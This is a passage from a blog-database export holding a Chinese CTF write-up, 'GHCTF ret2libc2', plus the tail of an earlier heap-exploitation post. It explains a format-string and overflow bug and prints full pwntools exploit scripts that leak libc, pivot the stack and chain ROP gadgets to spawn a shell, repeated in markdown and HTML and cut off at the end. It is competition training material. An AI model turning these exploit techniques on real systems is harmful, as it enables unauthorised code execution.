class=\"number\">8</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free=u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>现在看来，delete(2)似乎有点多余了</p>\n"},{"title":"ret2libc2","_content":"# GHCTF ret2libc2\n\n## ida分析\n\n### func函数分析\n![6e5cf4e693a466433b60b2ca6baf7772.png](https://img.picui.cn/free/2025/03/09/67cd07aa94b2d.png)\n1.程序很简单,main函数里只有init和func，这里直接看到func函数\n2.可以看到存在一个格式化字符串漏洞和溢出漏洞.\n3.程序没有提供system和`/bin/sh\\x00`，需要泄露libc，完成ret2libc.\n\n### func汇编分析\n![98a456ad\n.png](https://img.picui.cn/free/2025/03/09/67cd08b4567ca.png)\n1.从汇编中可以看到更多信息.\n2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.\n3.同时，leave ret 留下了栈迁移的隐患。\n\n### gdb调试分析\n![65d.png](https://img.picui.cn/free/2025/03/09/67cd0bc176840.png)\n1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.\n2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。\n\n## 构造思路\n1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。\n2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。\n3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。\n\n## exp\n\n### 格式化字符串\n```python \nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nio=process(\"./ret2libc2\")\n#libc=ELF(\"libc.so.6\")\n#io=remote(\"node2.anna.nssctf.cn\",28626)\nelf=ELF(\"./ret2libc2\")\nbss=0x404060\nret=0x4011fa\ngdb.attach(io)\n\npayload1=b'%27$p'.ljust(8,b'a')\npayload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)\nio.sendafter(b'show your magic\\n',payload1)\nstart_addr=int(io.recv(14),16)-128\nlibc_base=start_addr-libc.symbols['__libc_start_main']\nlog.success(\"start_addr-{}\".format(hex(start_addr)))\npop_rdi=libc_base+0x2a3e5\nsystem=libc_base+libc.symbols['system']\nbinsh=libc_base+next(libc.search(b'/bin/sh'))\none=libc_base+0xebc85\n\npayload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)\nio.sendafter(b'show your magic\\n',payload2)\nio.interactive()\n```\n\n### 迁移泄露\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28268\nelf=ELF(\"./ret2libc2\")\nlibc=ELF(\"./libc.so.6\")\nif mode == 0:\n    io=process(\"./ret2libc2\")\nelse :\n    io=remote(url,port)\n\n\n#leave_ret=0x\nputs_got=elf.got['puts']\nputs_plt=elf.plt['puts']\ncomplete=0x404070\nfunc=0x40121f\nmagic=0x401252\nbss=elf.bss()+0x500+0x500\nrsp_8=0x401016\noffset=0x30+8\npayload=b'%13$s'.ljust(0x30,b'\\x61')\npayload+=p64(0x404038)\npayload+=p64(func)\npayload+=p64(puts_got)\n\n#\nio.sendafter(\"show your magic\\n\",payload)\n\nread=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('read-{}'.format(hex(read)))\n\nlibc_base=read-libc.sym['read']\nsys=libc_base+libc.sym['system']\nputs=libc_base+libc.sym['puts']\nprintf=libc_base+libc.sym['printf']\nsetvbuf=libc_base+libc.sym['setvbuf']\nbin_sh=libc_base+next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi=libc_base+0x2a3e5\nret=libc_base+0x29139\n\npayload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)\npayload+=p64(bss)+p64(magic)\nio.sendafter(\"show your magic\\n\",payload)\n#gdb.attach(io)\npayload=offset * b'a'\npayload+=p64(pop_rdi)\npayload+=p64(bin_sh)\npayload+=p64(ret)\npayload+=p64(sys)\nio.send(payload)\n\nio.interactive()\n```","source":"_posts/ret2libc/GHCTF ret2libc2.md","raw":"---\ntitle: ret2libc2\n---\n# GHCTF ret2libc2\n\n## ida分析\n\n### func函数分析\n![6e5cf4e693a466433b60b2ca6baf7772.png](https://img.picui.cn/free/2025/03/09/67cd07aa94b2d.png)\n1.程序很简单,main函数里只有init和func，这里直接看到func函数\n2.可以看到存在一个格式化字符串漏洞和溢出漏洞.\n3.程序没有提供system和`/bin/sh\\x00`，需要泄露libc，完成ret2libc.\n\n### func汇编分析\n![98a456ad\n.png](https://img.picui.cn/free/2025/03/09/67cd08b4567ca.png)\n1.从汇编中可以看到更多信息.\n2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.\n3.同时，leave ret 留下了栈迁移的隐患。\n\n### gdb调试分析\n![65d.png](https://img.picui.cn/free/2025/03/09/67cd0bc176840.png)\n1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.\n2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。\n\n## 构造思路\n1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。\n2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。\n3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。\n\n## exp\n\n### 格式化字符串\n```python \nfrom pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nio=process(\"./ret2libc2\")\n#libc=ELF(\"libc.so.6\")\n#io=remote(\"node2.anna.nssctf.cn\",28626)\nelf=ELF(\"./ret2libc2\")\nbss=0x404060\nret=0x4011fa\ngdb.attach(io)\n\npayload1=b'%27$p'.ljust(8,b'a')\npayload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)\nio.sendafter(b'show your magic\\n',payload1)\nstart_addr=int(io.recv(14),16)-128\nlibc_base=start_addr-libc.symbols['__libc_start_main']\nlog.success(\"start_addr-{}\".format(hex(start_addr)))\npop_rdi=libc_base+0x2a3e5\nsystem=libc_base+libc.symbols['system']\nbinsh=libc_base+next(libc.search(b'/bin/sh'))\none=libc_base+0xebc85\n\npayload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)\nio.sendafter(b'show your magic\\n',payload2)\nio.interactive()\n```\n\n### 迁移泄露\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=1\nurl='node2.anna.nssctf.cn'\nport=28268\nelf=ELF(\"./ret2libc2\")\nlibc=ELF(\"./libc.so.6\")\nif mode == 0:\n    io=process(\"./ret2libc2\")\nelse :\n    io=remote(url,port)\n\n\n#leave_ret=0x\nputs_got=elf.got['puts']\nputs_plt=elf.plt['puts']\ncomplete=0x404070\nfunc=0x40121f\nmagic=0x401252\nbss=elf.bss()+0x500+0x500\nrsp_8=0x401016\noffset=0x30+8\npayload=b'%13$s'.ljust(0x30,b'\\x61')\npayload+=p64(0x404038)\npayload+=p64(func)\npayload+=p64(puts_got)\n\n#\nio.sendafter(\"show your magic\\n\",payload)\n\nread=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success('read-{}'.format(hex(read)))\n\nlibc_base=read-libc.sym['read']\nsys=libc_base+libc.sym['system']\nputs=libc_base+libc.sym['puts']\nprintf=libc_base+libc.sym['printf']\nsetvbuf=libc_base+libc.sym['setvbuf']\nbin_sh=libc_base+next(libc.search(b\"/bin/sh\\x00\"))\npop_rdi=libc_base+0x2a3e5\nret=libc_base+0x29139\n\npayload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)\npayload+=p64(bss)+p64(magic)\nio.sendafter(\"show your magic\\n\",payload)\n#gdb.attach(io)\npayload=offset * b'a'\npayload+=p64(pop_rdi)\npayload+=p64(bin_sh)\npayload+=p64(ret)\npayload+=p64(sys)\nio.send(payload)\n\nio.interactive()\n```","slug":"ret2libc/GHCTF ret2libc2","published":1,"date":"2025-03-24T14:32:33.573Z","updated":"2025-03-24T14:38:40.233Z","comments":1,"layout":"post","photos":[],"_id":"cm8nyp9ig0007bcmy8juf56gu","content":"<h1 id=\"GHCTF-ret2libc2\"><a href=\"#GHCTF-ret2libc2\" class=\"headerlink\" title=\"GHCTF ret2libc2\"></a>GHCTF ret2libc2</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"func函数分析\"><a href=\"#func函数分析\" class=\"headerlink\" title=\"func函数分析\"></a>func函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd07aa94b2d.png\" alt=\"6e5cf4e693a466433b60b2ca6baf7772.png\"><br>1.程序很简单,main函数里只有init和func，这里直接看到func函数<br>2.可以看到存在一个格式化字符串漏洞和溢出漏洞.<br>3.程序没有提供system和<code>/bin/sh\\x00</code>，需要泄露libc，完成ret2libc.</p>\n<h3 id=\"func汇编分析\"><a href=\"#func汇编分析\" class=\"headerlink\" title=\"func汇编分析\"></a>func汇编分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd08b4567ca.png\" alt=\"98a456ad\n.png\"><br>1.从汇编中可以看到更多信息.<br>2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.<br>3.同时，leave ret 留下了栈迁移的隐患。</p>\n<h3 id=\"gdb调试分析\"><a href=\"#gdb调试分析\" class=\"headerlink\" title=\"gdb调试分析\"></a>gdb调试分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd0bc176840.png\" alt=\"65d.png\"><br>1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6&#x3D;27.<br>2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。<br>2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。<br>3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;libc.so.6&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28626)</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span></span><br><span class=\"line\">ret=<span class=\"number\">0x4011fa</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;%27$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload1=payload1.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(bss+<span class=\"number\">0x900</span>)+p64(<span class=\"number\">0x401227</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload1)</span><br><span class=\"line\">start_addr=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">128</span></span><br><span class=\"line\">libc_base=start_addr-libc.symbols[<span class=\"string\">&#x27;__libc_start_main&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;start_addr-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(start_addr)))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">system=libc_base+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\">one=libc_base+<span class=\"number\">0xebc85</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2=<span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0x38</span>)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"迁移泄露\"><a href=\"#迁移泄露\" class=\"headerlink\" title=\"迁移泄露\"></a>迁移泄露</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28268</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#leave_ret=0x</span></span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">complete=<span class=\"number\">0x404070</span></span><br><span class=\"line\">func=<span class=\"number\">0x40121f</span></span><br><span class=\"line\">magic=<span class=\"number\">0x401252</span></span><br><span class=\"line\">bss=elf.bss()+<span class=\"number\">0x500</span>+<span class=\"number\">0x500</span></span><br><span class=\"line\">rsp_8=<span class=\"number\">0x401016</span></span><br><span class=\"line\">offset=<span class=\"number\">0x30</span>+<span class=\"number\">8</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;%13$s&#x27;</span>.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404038</span>)</span><br><span class=\"line\">payload+=p64(func)</span><br><span class=\"line\">payload+=p64(puts_got)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">read=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;read-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(read)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=read-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">sys=libc_base+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts=libc_base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">printf=libc_base+libc.sym[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">setvbuf=libc_base+libc.sym[<span class=\"string\">&#x27;setvbuf&#x27;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=libc_base+<span class=\"number\">0x29139</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)</span><br><span class=\"line\">payload+=p64(bss)+p64(magic)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;show your magic\\n&quot;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">payload=offset * <span class=\"string\">b&#x27;a&#x27;</span></span><br><span class=\"line\">payload+=p64(pop_rdi)</span><br><span class=\"line\">payload+=p64(bin_sh)</span><br><span class=\"line\">payload+=p64(ret)</span><br><span class=\"line\">payload+=p64(sys)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"GHCTF-ret2libc2\"><a href=\"#GHCTF-ret2libc2\" class=\"headerlink\" title=\"GHCTF ret2libc2\"></a>GHCTF ret2libc2</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"func函数分析\"><a href=\"#func函数分析\" class=\"headerlink\" title=\"func函数分析\"></a>func函数分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd07aa94b2d.png\" alt=\"6e5cf4e693a466433b60b2ca6baf7772.png\"><br>1.程序很简单,main函数里只有init和func，这里直接看到func函数<br>2.可以看到存在一个格式化字符串漏洞和溢出漏洞.<br>3.程序没有提供system和<code>/bin/sh\\x00</code>，需要泄露libc，完成ret2libc.</p>\n<h3 id=\"func汇编分析\"><a href=\"#func汇编分析\" class=\"headerlink\" title=\"func汇编分析\"></a>func汇编分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd08b4567ca.png\" alt=\"98a456ad\n.png\"><br>1.从汇编中可以看到更多信息.<br>2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.<br>3.同时，leave ret 留下了栈迁移的隐患。</p>\n<h3 id=\"gdb调试分析\"><a href=\"#gdb调试分析\" class=\"headerlink\" title=\"gdb调试分析\"></a>gdb调试分析</h3><p><img src=\"https://img.picui.cn/free/2025/03/09/67cd0bc176840.png\" alt=\"65d.png\"><br>1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6&#x3D;27.<br>2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。<br>2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。<br>3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class=\"line\">io=process(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&quot;libc.so.6&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#io=remote(&quot;node2.anna.nssctf.cn&quot;,28626)</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./ret2libc2&quot;</span>)</span><br><span class=\"line\">bss=<span class=\"number\">0x404060</span></span><br><span class=\"line\">ret=<span class=\"number\">0x4011fa</span></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">b&#x27;%27$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload1=payload1.ljust(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(bss+<span class=\"number\">0x900</span>)+p64(<span class=\"number\">0x401227</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&#x27;show your magic\\n&#x27;</span>,payload1)</span><br><span class=\"line\">start_addr=<span class=\"built_in\">int</span>(io.recv(<span 